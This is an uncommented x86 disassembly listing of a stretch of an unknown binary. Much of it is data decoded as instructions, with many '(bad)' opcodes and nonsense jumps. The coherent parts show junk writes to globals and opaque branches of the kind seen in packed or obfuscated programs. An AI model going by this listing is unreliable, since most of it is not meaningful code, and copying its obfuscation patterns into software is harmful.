  4186f1:	push   ds
  4186f2:	enter  0xeea,0xd7
  4186f6:	pushf  
  4186f7:	mov    ds:0x3ad0bcac,eax
  4186fc:	fxch   st(2)
  4186fe:	cmp    al,0x73
  418700:	loope  0x4186c6
  418702:	in     al,dx
  418703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418704:	(bad)
  418707:	mov    al,ds:0x782049a4
  41870c:	pop    ecx
  41870d:	mov    ch,0x39
  41870f:	or     al,0x33
  418711:	xor    eax,0x7ff8d547
  418716:	aam    0xb6
  418718:	daa    
  418719:	sub    ebx,ebp
  41871b:	xor    bh,BYTE PTR [eax]
  41871d:	xor    ecx,eax
  41871f:	mov    ds:0xaf485608,al
  418724:	push   0x3ffc434a
  418729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41872a:	push   edi
  41872b:	fcmovnb st,st(4)
  41872d:	xor    DWORD PTR [edi-0x32505d8b],ebp
  418733:	lahf   
  418734:	ret    0x4676
  418737:	lods   eax,DWORD PTR ds:[esi]
  418738:	fmul   DWORD PTR [ebx-0x525d24]
  41873e:	sahf   
  41873f:	fbstp  TBYTE PTR [ebp+0x7156f2cb]
  418745:	sub    BYTE PTR [esi+0x3df71349],0x4a
  41874c:	test   al,0x5f
  41874e:	push   ss
  41874f:	cmp    al,0xd4
  418751:	or     DWORD PTR [eax+0x3a0fc38c],esp
  418757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418758:	push   0x58
  41875a:	jmp    0xcc9b:0xe8a80f3f
  418761:	xor    al,0x92
  418763:	(bad)  
  418764:	jle    0x41879a
  418766:	pop    ss
  418767:	or     dl,BYTE PTR [esi]
  418769:	arpl   WORD PTR [edx+0x40a3aca8],cx
  41876f:	lea    esi,[ebx+ecx*8-0x31]
  418773:	call   FWORD PTR [edi+0x26]
  418776:	add    al,0xb9
  418778:	push   esi
  418779:	inc    edx
  41877a:	in     eax,dx
  41877b:	(bad)  
  41877d:	fnstsw WORD PTR [ebp-0x6c]
  418780:	and    DWORD PTR [eax],esp
  418782:	in     eax,0xc0
  418784:	push   0xfffffffc
  418786:	push   esp
  418787:	or     al,BYTE PTR [edx-0x374bb772]
  41878d:	cmc    
  41878e:	dec    ebx
  41878f:	mov    ch,BYTE PTR [eax+eiz*8]
  418792:	std    
  418793:	test   BYTE PTR [esi],0x3b
  418796:	jnp    0x418767
  418798:	paddq  mm7,QWORD PTR [ecx]
  41879b:	jo     0x4187e4
  41879d:	xchg   ebp,eax
  41879e:	cli    
  41879f:	pop    es
  4187a0:	xchg   esi,eax
  4187a1:	retf   
  4187a2:	mov    dl,0xf2
  4187a4:	mov    al,0x79
  4187a6:	fild   QWORD PTR [eax-0x47]
  4187a9:	jo     0x4187d5
  4187ab:	bound  edi,QWORD PTR [edi-0xf]
  4187ae:	and    ebx,ecx
  4187b0:	imul   ecx,DWORD PTR [edx-0x61a97447],0x3f
  4187b7:	icebp  
  4187b8:	sub    cl,ah
  4187ba:	fcomip st,st(1)
  4187bc:	stos   DWORD PTR es:[edi],eax
  4187bd:	out    0xde,eax
  4187bf:	lds    edi,FWORD PTR [esi]
  4187c1:	(bad)  
  4187c2:	shl    DWORD PTR [eiz*4+0x5b72a3d],1
  4187c9:	fmul   st(2),st
  4187cb:	mov    ds:0xd9138623,eax
  4187d0:	or     eax,0x4b70ec68
  4187d5:	sbb    bl,0x7f
  4187d8:	xchg   esp,eax
  4187d9:	mov    ?,WORD PTR [eax+0x7a]
  4187dc:	xchg   ebx,eax
  4187dd:	fidiv  DWORD PTR [ebx-0x4b]
  4187e0:	(bad)  
  4187e1:	push   eax
  4187e2:	mov    ah,0x9b
  4187e4:	mov    ecx,edx
  4187e6:	inc    ecx
  4187e7:	and    DWORD PTR [edi-0x8307940],edi
  4187ed:	mov    esi,0xfa1681a6
  4187f2:	dec    ebx
  4187f3:	cmp    esi,DWORD PTR [edx+0x4f]
  4187f6:	jnp    0x4187f5
  4187f8:	sbb    ebp,DWORD PTR [esi+0x2d]
  4187fb:	imul   edx,DWORD PTR [esi-0x26],0x4
  4187ff:	fs mov al,0x3d
  418802:	inc    eax
  418803:	push   0xe2f64117
  418808:	por    mm2,mm5
  41880b:	sub    al,0x3a
  41880d:	mov    bl,BYTE PTR [eax+0x4]
  418810:	pop    ss
  418811:	imul   ebx,DWORD PTR [edi+edx*4]
  418815:	push   es
  418816:	das    
  418817:	inc    esp
  418818:	out    0x14,al
  41881a:	enter  0x5474,0x34
  41881e:	pop    esi
  41881f:	icebp  
  418820:	xchg   BYTE PTR ds:0x6d11d038,dl
  418826:	jno    0x418811
  418828:	xor    DWORD PTR [edi-0x2b94845],0x724f459f
  418832:	pop    ebp
  418833:	push   ds
  418834:	cmc    
  418835:	xchg   BYTE PTR [edx-0x20],cl
  418838:	sub    DWORD PTR [edx],0x76
  41883b:	ins    DWORD PTR es:[edi],dx
  41883c:	mov    ebx,0x32ba48c9
  418841:	repnz dec edi
  418843:	mov    al,ds:0xec7227ef
  418848:	jecxz  0x4187d7
  41884a:	pop    ds
  41884b:	xchg   esp,eax
  41884c:	pop    edx
  41884d:	ret    0x55ab
  418850:	rcl    ebx,0xbf
  418853:	imul   esi,DWORD PTR [edi-0x3c],0xfffffff5
  418857:	xchg   edi,eax
  418858:	inc    eax
  418859:	sahf   
  41885a:	aaa    
  41885b:	popa   
  41885c:	popf   
  41885d:	mov    esp,esi
  41885f:	in     eax,dx
  418860:	ja     0x418867
  418862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418863:	sbb    eax,0x549569d7
  418868:	out    0xd4,al
  41886a:	and    al,0xc
  41886c:	dec    esi
  41886d:	adc    ch,BYTE PTR [esi+0x6405]
  418873:	fild   DWORD PTR [edi+0x6f]
  418876:	ins    BYTE PTR es:[edi],dx
  418877:	imul   eax,ebx,0x6279f5be
  41887d:	sbb    BYTE PTR [ebx],al
  41887f:	ds push es
  418881:	mov    esp,0xe7449633
  418886:	mul    ecx
  418888:	(bad)  
  418889:	cmp    BYTE PTR [eax-0x45],bh
  41888c:	inc    ebx
  41888d:	js     0x4188c2
  41888f:	xor    DWORD PTR [eax],esi
  418891:	and    al,0x54
  418893:	in     al,dx
  418894:	mov    eax,ds:0xbc87b99c
  418899:	int3   
  41889a:	jnp    0x4188df
  41889c:	adc    bh,ah
  41889e:	in     al,dx
  41889f:	sbb    ch,BYTE PTR [ebx-0x73]
  4188a2:	ins    BYTE PTR es:[edi],dx
  4188a3:	jb     0x418914
  4188a5:	xor    ax,0x2e39
  4188a9:	stc    
  4188aa:	sub    BYTE PTR [edx+0x54160a24],al
  4188b0:	out    0x7b,al
  4188b2:	ret    0x254a
  4188b5:	mov    ecx,DWORD PTR [esp+0x48]
  4188b9:	or     DWORD PTR ds:0x42821b,0x42820b
  4188c3:	xor    eax,ecx
  4188c5:	adc    ecx,DWORD PTR ds:0x428133
  4188cb:	mov    ecx,DWORD PTR [esp+0x28]
  4188cf:	div    ecx
  4188d1:	adc    DWORD PTR ds:0x428223,0x42827b
  4188db:	and    eax,0x100
  4188e0:	xor    DWORD PTR ds:0x42816f,0x428273
  4188ea:	or     eax,0x290
  4188ef:	xor    DWORD PTR ds:0x42821f,0x42835f
  4188f9:	push   DWORD PTR [eax-0x494a7887]
  4188ff:	xor    DWORD PTR ds:0x42825b,0x7154
  418909:	call   DWORD PTR ds:0x428d88
  41890f:	or     DWORD PTR ds:0x428273,0x6165
  418919:	dec    esi
  41891a:	jne    0x417913
  418920:	add    DWORD PTR ds:0x428377,edi
  418926:	mov    DWORD PTR [esp+0x18],0xca79a575
  41892e:	cmp    DWORD PTR ds:0x4282ff,0x0
  418935:	mov    DWORD PTR ds:0x4282df,ebx
  41893b:	mov    DWORD PTR ds:0x428263,ebx
  418941:	mov    esi,DWORD PTR ds:0x428233
  418947:	mov    esi,0x63e7
  41894c:	jmp    0x4189b1
  418951:	mov    esi,0x7fb2
  418956:	cmp    DWORD PTR ds:0x4282ff,0x0
  41895d:	jb     0x41898b
  418963:	push   0x4fb4
  418968:	call   DWORD PTR ds:0x428dcc
  41896e:	movzx  esi,WORD PTR ds:0x428303
  418975:	sbb    DWORD PTR ds:0x428143,esi
  41897b:	adc    DWORD PTR ds:0x42834f,0x5f0e
  418985:	xor    DWORD PTR ds:0x428387,ebx
  41898b:	mov    esi,DWORD PTR ds:0x428217
  418991:	xor    esi,DWORD PTR ds:0x428153
  418997:	mov    DWORD PTR ds:0x428217,esi
  41899d:	add    DWORD PTR ds:0x428227,0x2d72
  4189a7:	sbb    DWORD PTR ds:0x428383,0x7522
  4189b1:	mov    esi,0x9c1b89e8
  4189b6:	mov    DWORD PTR [esp+0x1c],esi
  4189ba:	and    DWORD PTR ds:0x42835b,0x42821b
  4189c4:	mov    DWORD PTR [esp+0x70],0xca79a571
  4189cc:	mov    DWORD PTR [esp+0x74],esi
  4189d0:	xor    DWORD PTR ds:0x428143,0xa7a
  4189da:	call   0x40aa10
  4189df:	cmp    DWORD PTR ds:0x4282fb,0x0
  4189e6:	mov    edi,DWORD PTR ds:0x428283
  4189ec:	mov    edx,DWORD PTR ds:0x42820b
  4189f2:	not    edx
  4189f4:	jmp    0x418a47
  4189f9:	mov    DWORD PTR ds:0x428383,0x606f
  418a03:	mov    DWORD PTR ds:0x42815f,ebx
  418a09:	cmp    DWORD PTR ds:0x4282fb,0x0
  418a10:	jle    0x418a3f
  418a16:	call   DWORD PTR ds:0x428dd0
  418a1c:	adc    DWORD PTR ds:0x42813b,ebx
  418a22:	or     DWORD PTR ds:0x42823f,0x5c58
  418a2c:	xor    ecx,ecx
  418a2e:	add    ecx,DWORD PTR ds:0x4281ef
  418a34:	mov    edx,DWORD PTR ds:0x428313
  418a3a:	sub    ecx,edx
  418a3c:	and    ecx,DWORD PTR [ecx+edx*1]
  418a3f:	sub    edi,edx
  418a41:	sbb    ecx,DWORD PTR ds:0x428303
  418a47:	lea    eax,[esp+0x44]
  418a4b:	mov    DWORD PTR [esp+0xc],eax
  418a4f:	lea    eax,[esp+0x60]
  418a53:	add    DWORD PTR ds:0x428287,edi
  418a59:	mov    DWORD PTR [esp+0x10],eax
  418a5d:	cmp    DWORD PTR ds:0x428383,0x0
  418a64:	mov    edx,0x1d6
  418a69:	mov    DWORD PTR ds:0x42825b,0x11c5
  418a73:	mov    DWORD PTR ds:0x428377,ecx
  418a79:	jmp    0x418ad0
  418a7e:	movzx  eax,WORD PTR ds:0x42813b
  418a85:	mov    eax,ds:0x42827b
  418a8a:	cmp    DWORD PTR ds:0x428383,0x0
  418a91:	je     0x418ab0
  418a97:	push   0x2fa1
  418a9c:	call   DWORD PTR ds:0x428e70
  418aa2:	or     edi,ecx
  418aa4:	sbb    edi,0x59b9
  418aaa:	sbb    edx,0x32c6
  418ab0:	xor    DWORD PTR ds:0x428353,0x4bc8
  418aba:	sub    DWORD PTR ds:0x428263,edi
  418ac0:	or     DWORD PTR ds:0x42825b,0x2abb
  418aca:	sbb    DWORD PTR ds:0x42834f,ebx
  418ad0:	mov    eax,ds:0x422538
  418ad5:	mov    eax,DWORD PTR [eax+0x1d8]
  418adb:	sbb    DWORD PTR ds:0x42815b,ebx
  418ae1:	jmp    0x418eb0
  418ae6:	js     0x418b42
  418ae8:	push   ebp
  418ae9:	xor    eax,0x1a781a3b
  418aee:	or     eax,0xcfb0b184
  418af3:	ret    
  418af4:	lea    esi,[eax-0x66]
  418af7:	retf   
  418af8:	push   ss
  418af9:	sbb    BYTE PTR [edx+edx*1-0x4a58e7e8],bh
  418b00:	(bad)  [esi]
  418b02:	(bad)  
  418b03:	adc    eax,0x6c2645ca
  418b08:	(bad)  
  418b09:	jae    0x418abd
  418b0b:	dec    ecx
  418b0c:	add    esi,0x1df05daf
  418b12:	jno    0x418b13
  418b14:	jmp    0x3900:0x1355c5f3
  418b1b:	in     eax,dx
  418b1c:	ja     0x418b2e
  418b1e:	sbb    ah,BYTE PTR [eax]
  418b20:	jo     0x418ae6
  418b22:	adc    esp,esp
  418b24:	arpl   WORD PTR [edx+0x28],di
  418b27:	push   ebx
  418b28:	addr16 jmp 0x3ef4d28b
  418b2e:	dec    ecx
  418b2f:	xor    al,0x6
  418b31:	or     bh,BYTE PTR [edx+0x2c6b6b20]
  418b37:	lea    esp,[edi]
  418b39:	push   cs
  418b3a:	and    eax,0x1574f48f
  418b3f:	ins    BYTE PTR es:[edi],dx
  418b40:	push   es
  418b41:	dec    esi
  418b42:	cmp    BYTE PTR [ebx+0x38],bh
  418b45:	sbb    edi,esp
  418b47:	jno    0x418b10
  418b49:	test   bl,bh
  418b4b:	cmc    
  418b4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b4d:	fstp   TBYTE PTR [ecx-0x1652c9fe]
  418b53:	imul   DWORD PTR [esp+edi*2+0x6d]
  418b57:	cmp    ecx,edx
  418b59:	fst    DWORD PTR [edx+0x6c50a565]
  418b5f:	orps   xmm3,XMMWORD PTR [eax-0x4]
  418b63:	dec    ebx
  418b64:	dec    esi
  418b65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b66:	adc    DWORD PTR [esi],ebx
  418b68:	div    DWORD PTR [edi]
  418b6a:	fstp   st(5)
  418b6c:	lock mov ds:0xaaf7974d,eax
  418b72:	mov    cl,0xc9
  418b74:	mov    edx,0x521eee86
  418b79:	add    bl,BYTE PTR [edi]
  418b7b:	retf   0xb0fb
  418b7e:	and    DWORD PTR [edi+0x1e],edi
  418b81:	push   0x56ae41f1
  418b86:	fdiv   st,st(1)
  418b88:	into   
  418b89:	icebp  
  418b8a:	xlat   BYTE PTR ds:[ebx]
  418b8b:	ret    
  418b8c:	or     eax,0x52349766
  418b91:	sbb    ecx,ebp
  418b93:	cmp    bl,BYTE PTR [eax]
  418b95:	cwde   
  418b96:	stos   BYTE PTR es:[edi],al
  418b97:	inc    ebx
  418b98:	xchg   edi,eax
  418b99:	add    eax,0xd8ef9cec
  418b9e:	jp     0x418bdb
  418ba0:	test   eax,0x69063326
  418ba5:	mov    ah,0x4d
  418ba7:	(bad)  
  418ba8:	sub    BYTE PTR [eax-0x1faa4915],0xa8
  418baf:	mov    ss,WORD PTR [esi]
  418bb1:	shl    DWORD PTR [edi-0x28],0x0
  418bb5:	(bad)  
  418bb6:	jnp    0x418bc8
  418bb8:	sub    bl,bl
  418bba:	jb     0x418ba9
  418bbc:	inc    edx
  418bbd:	aad    0xd7
  418bbf:	inc    edi
  418bc0:	out    0x85,eax
  418bc2:	cmp    al,0x3c
  418bc4:	mov    esi,0xf5edbd7d
  418bc9:	js     0x418c48
  418bcb:	mov    dh,al
  418bcd:	sub    al,0xf6
  418bcf:	ds repnz cli 
  418bd2:	or     ebx,DWORD PTR [ebp+0x70]
  418bd5:	inc    eax
  418bd6:	and    al,0x51
  418bd8:	sub    al,BYTE PTR [ecx+0x75c1eb8d]
  418bde:	call   0x151d:0xc05f2c4c
  418be5:	(bad)  [ecx+0xd]
  418be8:	(bad)  
  418be9:	retf   
  418bea:	adc    DWORD PTR [esi],0x2f
  418bed:	lock dec eax
  418bef:	es xchg bl,bl
  418bf2:	add    esi,DWORD PTR ds:0x6468a76f
  418bf8:	inc    edx
  418bf9:	sbb    esi,DWORD PTR [edx-0xeed9e3b]
  418bff:	sbb    DWORD PTR [ebp-0x2a],0xadb468e0
  418c06:	inc    eax
  418c07:	mov    al,ds:0xe9bc795f
  418c0c:	std    
  418c0d:	jl     0x418c4d
  418c0f:	(bad)  
  418c10:	jo     0x418bdd
  418c12:	mov    bh,0x34
  418c14:	je     0x418bb4
  418c16:	je     0x418c49
  418c18:	cmp    eax,0x7b787e09
  418c1d:	(bad)  
  418c1e:	js     0x418c85
  418c20:	aaa    
  418c21:	and    dl,BYTE PTR [esi+0x45]
  418c24:	loopne 0x418c7c
  418c26:	dec    ebp
  418c27:	hlt    
  418c28:	iret   
  418c29:	bound  esi,QWORD PTR [ecx-0x61]
  418c2c:	add    edi,eax
  418c2e:	cmp    ah,0x82
  418c31:	call   0xba5f:0x1d4cc2e2
  418c38:	out    dx,al
  418c39:	fidiv  DWORD PTR ds:[esi+0x1c3df323]
  418c40:	mov    bl,0x81
  418c42:	jne    0x418c75
  418c44:	mov    ah,0xf8
  418c46:	mov    bl,0xb4
  418c48:	mov    esi,0xeef9cd75
  418c4d:	aam    0xf6
  418c4f:	push   ds
  418c50:	cli    
  418c51:	pop    ebp
  418c52:	je     0x418c90
  418c54:	sub    ebx,DWORD PTR [ebx+0x38960673]
  418c5a:	cwde   
  418c5b:	adc    al,0x6
  418c5d:	or     al,0xa6
  418c5f:	mov    ebx,0x417612e
  418c64:	dec    dl
  418c66:	sbb    DWORD PTR [ebp+edi*4+0x893f9a6],esi
  418c6d:	leave  
  418c6e:	je     0x418cc9
  418c70:	sbb    DWORD PTR [ebp-0x358cc09e],edx
  418c76:	adc    DWORD PTR [ebx],ecx
  418c78:	not    BYTE PTR [ebp+eiz*2+0x43]
  418c7c:	cdq    
  418c7d:	fiadd  DWORD PTR [ebx-0x5b0ca74d]
  418c83:	adc    ecx,DWORD PTR [edx+esi*2+0x6c51145d]
  418c8a:	sub    ebp,DWORD PTR [edi+0x37299408]
  418c90:	add    BYTE PTR [eax+0x27],bl
  418c93:	inc    edx
  418c94:	mov    ecx,0xc370bf2c
  418c99:	dec    ebp
  418c9a:	das    
  418c9b:	sub    BYTE PTR [ecx-0x48],dh
  418c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c9f:	add    ebp,DWORD PTR [edi]
  418ca1:	adc    BYTE PTR [ecx-0x6aaf0b24],dh
  418ca7:	sub    al,ah
  418ca9:	es test eax,0xf192c24a
  418caf:	ds test al,0x1f
  418cb2:	sbb    BYTE PTR [ecx+0x73],dh
  418cb5:	dec    esi
  418cb6:	mov    BYTE PTR [esp+edi*8-0x274d69fd],bl
  418cbd:	enter  0x517e,0xc5
  418cc1:	jg     0x418d09
  418cc3:	in     al,dx
  418cc4:	out    0xac,al
  418cc6:	imul   esi,esi,0x96f0262e
  418ccc:	jno    0x418cb9
  418cce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ccf:	cs mov dl,0x13
  418cd2:	(bad)  
  418cd4:	lods   eax,DWORD PTR ds:[esi]
  418cd5:	xchg   edx,ebp
  418cd7:	(bad)  
  418cd8:	sbb    eax,0x3b7e5de8
  418cdd:	cmp    eax,0x5c9c925e
  418ce2:	xlat   BYTE PTR ds:[ebx]
  418ce3:	xchg   edx,eax
  418ce4:	call   0x8d9d:0x550ea46a
  418ceb:	inc    BYTE PTR [esi-0x72f4bc2a]
  418cf1:	std    
  418cf2:	inc    esp
  418cf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cf4:	loope  0x418cdf
  418cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cf7:	std    
  418cf8:	iret   
  418cf9:	mov    eax,0x4081777f
  418cfe:	test   BYTE PTR [esi],dh
  418d00:	mov    BYTE PTR [ebp+eax*4-0x3f9b804c],ah
  418d07:	sar    BYTE PTR [ecx+eax*4-0x3325f5b6],0x1d
  418d0f:	cmp    DWORD PTR [ebp-0x2bf0ef69],edi
  418d15:	(bad)  
  418d16:	wbinvd 
  418d18:	mov    bh,BYTE PTR [ebp-0x1d]
  418d1b:	icebp  
  418d1c:	lods   al,BYTE PTR ds:[esi]
  418d1d:	mov    BYTE PTR [edi],dh
  418d1f:	dec    esi
  418d20:	inc    edx
  418d21:	pop    edx
  418d22:	std    
  418d23:	lea    edx,[ecx+0x58]
  418d26:	cmp    eax,0x88127840
  418d2b:	sbb    al,BYTE PTR [ebp+0x3f]
  418d2e:	sbb    al,BYTE PTR [edi]
  418d30:	xor    eax,0x12273027
  418d35:	add    bl,BYTE PTR [esi+0x0]
  418d38:	dec    eax
  418d39:	xchg   ebx,eax
  418d3a:	sbb    ebx,esi
  418d3c:	int    0xf2
  418d3e:	int    0x3d
  418d40:	sub    esp,DWORD PTR [edx-0x7549e182]
  418d46:	sub    DWORD PTR [edx-0x4c83eee8],ebx
  418d4c:	ror    DWORD PTR [ebp+eiz*2-0x61],cl
  418d50:	jmp    0xf881fcbb
  418d55:	push   cs
  418d56:	pop    eax
  418d57:	loop   0x418dca
  418d59:	daa    
  418d5a:	(bad)  
  418d5b:	xchg   ecx,eax
  418d5c:	and    BYTE PTR [edx-0x222c05d2],cl
  418d62:	sub    bh,BYTE PTR [ecx]
  418d64:	or     al,0x62
  418d66:	in     al,dx
  418d67:	fdiv   st(3),st
  418d69:	rcl    BYTE PTR [ecx+0x55],1
  418d6c:	das    
  418d6d:	lds    edi,FWORD PTR [ebp+0x4d6e7cc6]
  418d73:	cmp    ebx,ebp
  418d75:	or     ah,BYTE PTR ds:0xe331e258
  418d7b:	ins    DWORD PTR es:[edi],dx
  418d7c:	arpl   WORD PTR [eax*8-0x363fe424],di
  418d83:	out    0x77,al
  418d85:	pusha  
  418d86:	retf   
  418d87:	aas    
  418d88:	and    DWORD PTR [ebp+0x2b],ecx
  418d8b:	xor    al,0x1c
  418d8d:	rcl    bl,1
  418d8f:	stos   DWORD PTR es:[edi],eax
  418d90:	mov    edi,0x37c7c1f8
  418d95:	and    eax,0xa85fb3e3
  418d9a:	or     esp,esi
  418d9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d9d:	dec    eax
  418d9e:	sar    DWORD PTR [edi+0x1e],1
  418da1:	inc    esi
  418da2:	(bad)  
  418da5:	scas   eax,DWORD PTR es:[edi]
  418da6:	fimul  WORD PTR [esi]
  418da8:	retf   0xb0b5
  418dab:	push   0x2895c114
  418db0:	cs call 0xa45a:0x6f801558
  418db8:	xor    BYTE PTR [eax+ecx*2],dh
  418dbb:	push   ebp
  418dbc:	or     DWORD PTR [eax],edi
  418dbe:	push   eax
  418dbf:	cmc    
  418dc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418dc1:	inc    ecx
  418dc2:	pop    edi
  418dc3:	scas   eax,DWORD PTR es:[edi]
  418dc4:	stc    
  418dc5:	mov    ecx,0x18db6f31
  418dca:	fcom   DWORD PTR [esi-0x1606fd1d]
  418dd0:	addr16 stc 
  418dd2:	loopne 0x418dfe
  418dd4:	ins    DWORD PTR es:[edi],dx
  418dd5:	pop    es
  418dd6:	pop    eax
  418dd7:	cmp    BYTE PTR [eax+0x1f],dl
  418dda:	mov    al,ds:0xca88d80c
  418ddf:	dec    edi
  418de0:	mov    al,0x24
  418de2:	retf   
  418de3:	push   0x2f
  418de5:	or     DWORD PTR [ebx-0x2211e3a3],0x2a553905
  418def:	mov    BYTE PTR [edx-0x6b],ah
  418df2:	xor    DWORD PTR [ecx],ecx
  418df4:	push   esi
  418df5:	cmc    
  418df6:	std    
  418df7:	sub    cl,bl
  418df9:	sub    DWORD PTR [edi],0x8fedd38b
  418dff:	hlt    
  418e00:	cli    
  418e01:	and    DWORD PTR [edx],eax
  418e03:	ins    DWORD PTR es:[edi],dx
  418e04:	cmp    esp,DWORD PTR [esi+esi*8]
  418e07:	dec    ebp
  418e08:	out    dx,eax
  418e09:	test   eax,0x6c7da8af
  418e0e:	or     DWORD PTR [edi+0x354df81f],edi
  418e14:	int    0xd4
  418e16:	test   DWORD PTR [edi+eax*2+0x5bccfce7],ebp
  418e1d:	ret    0xc15b
  418e20:	in     eax,0x72
  418e22:	adc    al,0x4f
  418e24:	test   ecx,edx
  418e26:	sar    DWORD PTR [esi],cl
  418e28:	jmp    0x418dca
  418e2a:	shr    BYTE PTR [ebx],1
  418e2c:	or     BYTE PTR [esi],bh
  418e2e:	ret    
  418e2f:	iret   
  418e30:	fisubr WORD PTR [edx+0xe]
  418e33:	adc    al,0x3e
  418e35:	imul   ebx,esi,0xb6975204
  418e3b:	sub    cl,cl
  418e3d:	in     eax,0x40
  418e3f:	sub    ebp,esp
  418e41:	repnz fwait
  418e43:	mov    ds:0xf015a4b7,eax
  418e48:	mov    esp,DWORD PTR [ebp+0x548a9b66]
  418e4e:	push   esp
  418e4f:	jbe    0x418e2c
  418e51:	mov    dh,0x89
  418e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e54:	inc    esp
  418e55:	aad    0x10
  418e57:	sbb    eax,DWORD PTR [eax-0x6dbdc359]
  418e5d:	inc    ebx
  418e5e:	shr    DWORD PTR [edi-0x5a],0xbc
  418e62:	out    0xeb,eax
  418e64:	adc    DWORD PTR ds:0x6020a682,edx
  418e6a:	aas    
  418e6b:	mov    cl,0xcd
  418e6d:	rcl    DWORD PTR [edx-0x5a],1
  418e70:	cld    
  418e71:	cmp    eax,0xfab455bb
  418e76:	adc    al,0x61
  418e78:	outs   dx,BYTE PTR ds:[esi]
  418e79:	bound  eax,QWORD PTR [ebp+0x4f098510]
  418e7f:	or     DWORD PTR [edx],ebp
  418e81:	inc    edx
  418e82:	cmp    eax,0xba852fae
  418e87:	jno    0x418e4a
  418e89:	stos   BYTE PTR es:[edi],al
  418e8a:	xchg   ecx,eax
  418e8b:	and    al,0xc3
  418e8d:	inc    ecx
  418e8e:	and    al,0xaf
  418e90:	push   edx
  418e91:	ins    BYTE PTR es:[edi],dx
  418e92:	add    ecx,DWORD PTR [esi]
  418e94:	mov    bh,0xb9
  418e96:	lahf   
  418e97:	sub    eax,0xd788a978
  418e9c:	ins    DWORD PTR es:[edi],dx
  418e9d:	cmp    eax,0x3b8c392e
  418ea2:	gs jns 0x418e85
  418ea5:	mov    cl,0x4f
  418ea7:	ret    
  418ea8:	pop    ds
  418ea9:	clc    
  418eaa:	out    0x7c,eax
  418eac:	dec    edi
  418ead:	cmp    ecx,ebx
  418eaf:	outs   dx,BYTE PTR ds:[esi]
  418eb0:	mov    eax,DWORD PTR [eax]
  418eb2:	and    ecx,ecx
  418eb4:	mov    ecx,eax
  418eb6:	xor    ecx,0xa4069aaf
  418ebc:	cmp    DWORD PTR ds:0x42837f,0x0
  418ec3:	mov    DWORD PTR ds:0x428147,0x216c
  418ecd:	mov    DWORD PTR ds:0x42824b,0x28e7
  418ed7:	mov    DWORD PTR ds:0x428243,0x19fa
  418ee1:	jmp    0x418f4e
  418ee6:	mov    DWORD PTR ds:0x428253,0x562c
  418ef0:	mov    DWORD PTR ds:0x42827b,0x3af5
  418efa:	cmp    DWORD PTR ds:0x42837f,0x0
  418f01:	jae    0x418f2c
  418f07:	push   0x615d
  418f0c:	push   0x428307
  418f11:	push   DWORD PTR [ebp-0x28]
  418f14:	call   DWORD PTR ds:0x428dd4
  418f1a:	not    DWORD PTR ds:0x42817b
  418f20:	sub    DWORD PTR ds:0x42836f,0x3f9
  418f2a:	adc    edx,edx
  418f2c:	sub    edi,DWORD PTR ds:0x428133
  418f32:	mov    edx,DWORD PTR ds:0x428277
  418f38:	sbb    DWORD PTR ds:0x42835b,edx
  418f3e:	xor    edi,edi
  418f40:	or     edi,DWORD PTR ds:0x4282b3
  418f46:	mov    edi,DWORD PTR [edi]
  418f48:	and    DWORD PTR ds:0x4282eb,edi
  418f4e:	xor    eax,0xfffffffe
  418f51:	and    DWORD PTR ds:0x42836f,edi
  418f57:	shl    eax,0x1e
  418f5a:	shr    ecx,0x2
  418f5d:	sbb    DWORD PTR ds:0x428383,edi
  418f63:	or     ecx,eax
  418f65:	cmp    DWORD PTR ds:0x4282db,0x0
  418f6c:	not    DWORD PTR ds:0x428247
  418f72:	not    DWORD PTR ds:0x428177
  418f78:	mov    DWORD PTR ds:0x4282cf,0x4dce
  418f82:	mov    edx,0xaa6
  418f87:	jmp    0x418fde
  418f8c:	mov    eax,ds:0x4282ff
  418f91:	mov    eax,0x4392
  418f96:	cmp    DWORD PTR ds:0x4282db,0x0
  418f9d:	jae    0x418fc8
  418fa3:	push   0x4547
  418fa8:	push   0x4fda
  418fad:	push   DWORD PTR [ebp-0x1c]
  418fb0:	push   0x42835b
  418fb5:	call   DWORD PTR ds:0x428dd8
  418fbb:	inc    edx
  418fbc:	or     DWORD PTR ds:0x42820f,ebx
  418fc2:	xor    edi,DWORD PTR ds:0x42816f
  418fc8:	sbb    edx,0x3d5c
  418fce:	xor    DWORD PTR ds:0x42835f,0x3cf0
  418fd8:	sub    edx,0x3f96
  418fde:	mov    eax,DWORD PTR [esp+0x10]
  418fe2:	mov    DWORD PTR [eax],ecx
  418fe4:	mov    edi,0xca79a565
  418fe9:	add    DWORD PTR ds:0x42816b,0x586a
  418ff3:	mov    DWORD PTR [esp+0x80],edi
  418ffa:	and    DWORD PTR ds:0x42814f,ecx
  419000:	mov    DWORD PTR [esp+0x84],esi
  419007:	cmp    DWORD PTR ds:0x42813f,0x0
  41900e:	mov    DWORD PTR ds:0x428153,0x4347
  419018:	mov    DWORD PTR ds:0x428177,0x6064
  419022:	mov    DWORD PTR ds:0x42825f,edi
  419028:	jmp    0x419076
  41902d:	mov    DWORD PTR ds:0x428233,edi
  419033:	mov    eax,0x1d71
  419038:	cmp    DWORD PTR ds:0x42813f,0x0
  41903f:	jl     0x419063
  419045:	push   DWORD PTR [ebp-0x18]
  419048:	push   DWORD PTR [ebp-0x28]
  41904b:	push   0x1442
  419050:	push   0x27e7
  419055:	call   DWORD PTR ds:0x428ddc
  41905b:	add    edx,edx
  41905d:	not    DWORD PTR ds:0x4282cf
  419063:	or     ecx,edx
  419065:	movzx  edx,BYTE PTR ds:0x42820b
  41906c:	or     DWORD PTR ds:0x42834f,edx
  419072:	sub    ecx,edx
  419074:	add    edx,edx
  419076:	mov    eax,DWORD PTR [esp+0x80]
  41907d:	adc    edx,0x23f1
  419083:	jmp    0x419452
  419088:	lock adc BYTE PTR [ecx],dh
  41908b:	fidiv  WORD PTR [ecx]
  41908d:	push   ds
  41908e:	push   ds
